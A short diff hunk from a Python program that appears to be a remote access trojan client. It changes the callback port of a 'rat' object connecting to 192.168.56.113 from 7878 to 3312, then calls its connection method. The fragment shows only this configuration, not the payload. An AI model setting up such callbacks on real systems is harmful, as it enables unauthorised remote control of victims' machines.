@@ -90,7 +90,7 @@ class CLIENT:
                 file.close()
 
                 
-rat = CLIENT('192.168.56.113', 7878)
+rat = CLIENT('192.168.56.113', 3312)
 
 if __name__ == '__main__':
     rat.connection()
